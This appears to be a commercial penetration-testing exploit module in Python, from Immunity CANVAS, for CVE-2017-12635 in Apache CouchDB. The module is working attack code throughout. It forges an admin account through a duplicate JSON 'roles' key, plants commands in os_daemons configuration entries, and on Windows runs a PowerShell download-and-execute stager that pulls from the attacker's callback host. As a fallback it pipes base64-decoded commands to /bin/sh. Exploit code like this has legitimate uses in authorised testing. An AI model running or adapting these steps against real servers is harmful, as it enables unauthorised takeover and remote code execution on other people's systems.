#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2016
#http://www.immunityinc.com/products/canvas/index.html for more information

import sys
import time
import socket

#covers both angles
if "." not in sys.path: sys.path.append(".")

# import libs.spkproxy as spkproxy
import libs.spkproxy as spkproxy
import urllib
import base64
import json


from tcpexploit import tcpexploit
from libs.canvasos import canvasos
from exploitutils import *
from ExploitTypes.CommandLineExecuter import CommandExploit

from Nodes.mosdef_powershell.mosdef_powershell import *

from MOSDEF.cc import cc_main, threadsafe_cc_main
from canvasengine import canvas_root_directory


from Crypto.Hash import MD5
from Crypto.Cipher import DES

import random

import string
import urllib2
import cookielib
import ssl
import re
from HTMLParser import HTMLParser
from contextlib import contextmanager
import collections

NAME                           = "Apache CouchDB Authentication Bypass RCE"
DESCRIPTION                    = "Apache CouchDB RCE v1 < 1.7.0 and v2 < 2.1.1"
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "http://couchdb.apache.org/"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["CVE Name"]      = "CVE-2017-12635"
DOCUMENTATION["CVE URL"]       = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12635"
DOCUMENTATION["References"]    = ["https://justi.cz/security/2017/11/14/couchdb-rce-npm.html", "http://www.securityfocus.com/bid/101868"]

DOCUMENTATION['Notes']         = """
12/8/2017
Windows 10   / CouchDB 2.0.0 - Exploit created
Ubuntu 14.04 / CouchDB 1.5.0 - Exploit created

IMPORTANT NOTE:
If the exploit does not get you a shell, look in the Canvas log to see
if the exploit successfully created an administrative user. With that
user, you can log in to the admin panel of your target and programs
to start under the os_daemons key, as well as view other data.

IMPORTANT NOTE:
A _users database must be created by a previous admin for this exploit
to work.

"""

VERSION                        = "1.0"
PROPERTY                       = {}
PROPERTY['TYPE']               = "Web Exploits"
PROPERTY['SITE']               = "Remote"
PROPERTY['ARCH']               = [ "Linux" ]
PROPERTY['VERSION']            = [ "All" ]


class theexploit(tcpexploit, CommandExploit):
    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)

        self.autoFind           = False
        self.host               = ""
        self.port               = 5984

        self.badstring          = "\x00"
        self.version            = 1
        self.done               = 0
        self.name               = NAME

        self.basepath           = "/"
        self.hostname           = ""
        self.ssl                = False
        self.only_test          = False
        self.discover           = False
        self.vhost              = ''
        self.vulnerable         = []
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.auth               = None
        self.protocol              = "http"
        self.arg_node_address = ""
        # self.setVersions()
        self.supports_universal = True #for CommandExploits that support Universal MOSDEF (which you should!)
        self.data = None
        self.cookie = None

        self.daemons = []
        self.node_prefix = ""

    def make_admin_data(self, user_name, password):
        original = {"type": "user",
                    "name": user_name,
                    "roles": [],
                    "password": password}

        json_string = json.dumps(original)

        return json_string.replace('"roles": []', '"roles": ["_admin"], "roles": []')


    def displayVersions(self):
        for v in self.versions.keys():
            logging.info("Version %d: %s" % (v, self.versions[v][0]))

    def getargs(self):
        self.getarg("hostname")
        self.getarg("port")
        self.getarg("ssl")
        self.getarg("vhost")
        self.getarg("basepath")
        self.getarg("discover")
        self.getarg("arg_node_address")

        if self.ssl:
            self.protocol = "https"

        if self.basepath is None:
            self.basepath = "/"

        if not self.basepath.startswith("/"):
            self.basepath = "/" + self.basepath
        if not self.basepath.endswith("/"):
            self.basepath = self.basepath + "/"

        if not self.hostname:
            self.hostname = self.target.interface + ":" + str(self.port)

        if self.arg_node_address:
            if "@" not in self.arg_node_address:
                logging.warning("node address (%s) has suspicious name - is this what you intended?" % (self.arg_node_address))

    def neededListenerTypes(self):
        return self.cle_neededListenerTypes()

    def extract_cookie(self, response):
        cookie_data = []

        for line in response.split("\n"):
            if line.startswith("Set-Cookie"):
                for char in line[line.find("AuthSession="):]:
                    if char != ';':
                        cookie_data.append(char)
                    else:
                        break

        if len(cookie_data) != 0:
            return "".join(cookie_data)
        else:
            return None

    def log_in(self, user_name, password):
        login_data = "name=%s&password=%s" % (user_name, password)

        extra_headers = [("Accept", "application/json"),
                         ("X-Requested-With", "XMLHttpRequest"),
                         ("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"),
                         ("Accept-Encoding", "gzip, deflate"),
                         ("Accept-Language", "en-US,en;q=0.8"),
                         ("Cookie", "AuthSession=")]

        logging.info("Logging in using %s:%s" % (user_name, password))

        response_io, code = None, None

        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + self.basepath + "_session"


        try:
            (response_io, code) = spkproxy.urlopen(url,
                                                   exploit=None,
                                                   hostname=self.hostname,
                                                   extraheaders=extra_headers,
                                                   data=login_data,
                                                   entireresponse=True,
                                                   return_response_code=True,
                                                   auth=None,
                                                   verb="POST")
        except Exception as e:
            logging.error('Error during login: %s' % str(e))
            return None

        response = response_io.read()

        if code != 200:
            return None

        return self.extract_cookie(response)

    def http_delete(self, url):
        extra_headers = [("Accept", "application/json"),
                         ("X-Requested-With", "XMLHttpRequest"),
                         ("Accept-Encoding", "gzip, deflate"),
                         ("Accept-Language", "en-US,en;q=0.8")]


        response_io, code = None, None

        if self.cookie is not None:
            cookie_data = self.cookie
            extra_headers.append(("Cookie", cookie_data))


        try:
            (response_io, code) = spkproxy.urlopen(url,
                                                   exploit=None,
                                                   hostname=self.hostname,
                                                   extraheaders=extra_headers,
                                                   entireresponse=True,
                                                   return_response_code=True,
                                                   auth=None,
                                                   verb="DELETE")
        except Exception as e:
            logging.error('Error during login: %s' % str(e))
            return None


    def http_put(self, url, data):
        extra_headers = [("Accept", "application/json"),
                         ("X-Requested-With", "XMLHttpRequest"),
                         ("Accept-Encoding", "gzip, deflate"),
                         ("Accept-Language", "en-US,en;q=0.8")]


        response_io, code = None, None

        ua = spkproxy.UserAgent(url, hostname=self.hostname, exploit=self)

        ua.moreheaders.extend(extra_headers)

        if self.cookie is not None:
            cookie_data = self.cookie
            key, value = cookie_data.split("=")
            ua.SetCookie(key,value)

        response = None
        try:
            response = ua.PUT("", data, noresponse=True)
        except Exception as e:
            logging.error('Error during login: %s' % str(e))
            return None

    def random_string(self, chars=5):
        """
        Return a string that contains CHARS number of random alphabetic
        characters.
        """
        choices = []
        for _ in range(chars):
            choices.append(random.choice(string.ascii_letters))

        return "".join(choices)

    def get_replacers(self, text):
        replacers = set([])
        state = 0
        replacer_allowed_chars = ["_"]
        replacer_allowed_chars.extend(string.ascii_letters)

        current = []

        for i in text:
            if state == 0:
                if i == "{":
                    current.append(i)
                    state = 1
            elif state == 1:
                if i.isspace() or i not in replacer_allowed_chars:
                    state = 0
                    if i == "}":
                        current.append(i)
                        if len(current) != 2:
                            replacers.add("".join(current))
                    current = []
                else:
                    current.append(i)

        return replacers


    def run_blind_command(self, command):
        logging.info("Running command:" + command )
        daemon_name = self.gen_random_str()
        self.daemons.append(daemon_name)
        logging.info("Using daemon name:" + daemon_name)

        request = self.basepath + self.node_prefix + "_config/os_daemons/%s" % daemon_name
        # request = self.basepath + "_node/couchdb@localhost/_config/os_daemons/%s" % daemon_name

        command_url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + request

        command_string = None

        if not command.startswith("powershell"):
            # appears to just be providing arguments via createprocessa
            command_string = json.dumps("/bin/false | echo %s | base64 -d | /bin/sh" % base64.b64encode(command))
        else:
            command_string = json.dumps(command)

        try:
            self.http_put(command_url, command_string)
            time.sleep(1)
        except urllib2.HTTPError as e:
            logging.warning("Threw exception on request %s" % str(e))

        return False

    def gen_random_str(self, size=10, chars=string.ascii_letters):
        return ''.join(random.choice(chars) for x in range(size))

    def cleanup_daemons(self):
        logging.info("Deleting os_daemon entries")
        for daemon_name in self.daemons:
            request = self.basepath + "_config/os_daemons/%s" % daemon_name

            command_url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + request

            self.http_delete(command_url)

        self.daemons = []

    def get_random_salt(self):
        return "".join([chr(random.randint(0, 0xff)) for i in range(0, 8)])

    def inject_user(self):
        user_name = self.gen_random_str()
        password = self.gen_random_str()

        # request = self.basepath + "_users"
        # url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + request
        # self.http_put(url, "")

        request = self.basepath + "_users/org.couchdb.user:%s" % user_name

        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + request

        logging.info("[inject_user] url:" + url)

        admin_data = self.make_admin_data(user_name, password)
        logging.info("Evil admin-creating-json: " + admin_data)
        response = self.http_put(url, admin_data)
        # logging.info("response:" + str(response))

        return (user_name, password)

    def test(self):
        self.getargs()
        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + self.basepath

        try:
            (response_io, code) = spkproxy.urlopen(url,
                                                   exploit=None,
                                                   hostname=self.hostname,
                                                   return_response_code=True,
                                                   auth=None,
                                                   verb="GET")
        except Exception as e:
            logging.error('Error during version check: %s' % str(e))
            return None

        response = response_io.read()

        logging.error("Version response: %s" % response)
        metadata = None
        try:
            metadata = json.loads(response)
        except Exception as e:
            logging.info("Failed to parse response, unlikely to be CouchDB install")
            return False
        else:
            if (metadata["version"][0] == "1"):
                return metadata["version"] < "1.7.0"
            elif (metadata["version"] == "2"):
                return metadata["version"] < "2.1.1"

    def get_nodes(self):

        extra_headers = [("Accept", "application/json"),
                         ("X-Requested-With", "XMLHttpRequest"),
                         ("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8"),
                         ("Accept-Encoding", "gzip, deflate"),
                         ("Accept-Language", "en-US,en;q=0.8"),
                         ("Cookie", "AuthSession=")]

        if self.cookie is not None:
            cookie_data = self.cookie
            extra_headers.append(("Cookie", cookie_data))

        response_io, code = None, None

        url = (self.protocol + "://" + self.target.interface + ":%s" % self.port) + self.basepath + "_membership"


        try:
            (response_io, code) = spkproxy.urlopen(url,
                                                   exploit=None,
                                                   hostname=self.hostname,
                                                   extraheaders=extra_headers,
                                                   return_response_code=True,
                                                   auth=None,
                                                   verb="GET")
        except Exception as e:
            logging.error('Error during membership grab: %s' % str(e))
            return None

        response = response_io.read()
        membership = None

        try:
            membership = json.loads(response)
        except KeyboardInterrupt:
            raise
        except Exception as e:
            logging.error("Unable to parse membership dictionary")
            raise

        if code != 200:
            return None

        # on earlier versions, accessing _membership results in an error
        if "all_nodes" in membership:
            return membership["all_nodes"]
        else:
            return None

    def powershell_stager(self, port):
        stager_template = None

        ps_mosdef = mosdef_powershell(self)

        powershell_string = ps_mosdef.createMosdefCallback().replace("\n", "\r\n")

        with open(os.path.join(os.path.dirname(__file__), "Resources", "stager_template"), "rb") as handle:
            stager_template = handle.read()

        replacers = self.get_replacers(stager_template)

        ignored_replacers = ["{psmosdef_byte_array}",
                             "{ENTER}"]

        for replacer in replacers:
            if replacer not in ignored_replacers:
                stager_template = stager_template.replace(replacer, self.random_string(5))
            elif replacer == "{psmosdef_byte_array}":
                stager_template = stager_template.replace(replacer, ",".join(["%d" % ord(x) for x in powershell_string]))

        return stager_template

    def set_up_webserver(self, port, stager_data):
        app=self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"]=port
        app.argsDict["singleexploit"]="upload"
        app.argsDict["sourcedata"]=stager_data
        ret=app.listen()
        self.server=app

        return ret


    def exploit_windows(self):
        final_port = None
        for port in range(8080, 0xffff):
            ps_stager = self.powershell_stager(port)

            if self.set_up_webserver(port, ps_stager):
                final_port = port
                break

        command = "iex (new-object net.webclient).downloadstring(\"%s\")" % ("http://" + self.callback.ip + ":" + str(port) + "/" + self.random_string(10))

        logging.info("Stager command: %s" % command)

        self.run_blind_command("powershell.exe -executionpolicy bypass -encodedcommand %s" % base64.b64encode(command.encode('utf-16le')))

    def run(self):
        self.getargs()

        self.setInfo("%s (in progress)" % (NAME))

        (user_name, password) = self.inject_user()

        # NN: this is 100% necessary.
        time.sleep(3)
        cookie = self.log_in(user_name, password)

        # getting the real config path happens here
        # (ex: node/couchdb@localhost/...)

        if cookie is not None:
            self.cookie = cookie
            logging.info("Log in with user:%s , password:%s if this exploit fails for an admin panel" % (user_name, password))

            node_addresses = self.get_nodes()

            if node_addresses != None:
                logging.info("Run the module again with the node address")
                logging.info("set to one of these names to root more systems")

                for address in node_addresses:
                    logging.info(str(address))

                if not self.arg_node_address:
                    local_node_addresses = [address for address in node_addresses if any(["@localhost" in address, "@127.0.0.1" in address]) ]

                    if not len(node_addresses):
                        logging.error("bad all_nodes list, exiting")
                        return 0

                    logging.info("Attacking node: %s" % (local_node_addresses[0]))
                    self.node_prefix = "_node/%s/" % local_node_addresses[0]
                else:
                    logging.info("Attacking node: %s" % (self.arg_node_address))
                    self.node_prefix = "_node/%s/" % self.arg_node_address

            logging.info("Assuming windows is target os, if this fails (*nix) will be assumed")
            self.exploit_windows()

            start = time.time()

            while (self.state != "HALT") and ((time.time() - start) < 20.0) and not self.ISucceeded():
                self.server.accept()

            logging.info("Checking if we succeeded...")
            time.sleep(5)

            # NN: this only works for unix
            if not self.ISucceeded():
                self.getargs_cle()
                self.get_os()
                self.upload_and_execute()
        else:
            logging.info("Unable to create new admin account. Exiting...")
            return 0

        # This is to appease ISucceeded.
        time.sleep(1)
        logging.info("Exiting...")

        self.cleanup_daemons()

        if self.ISucceeded():
            logging.warning("Module succeeded")
            self.setInfo("%s - done (success)" % (NAME))
            return 1
        else:
            logging.error('Module failed')
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)
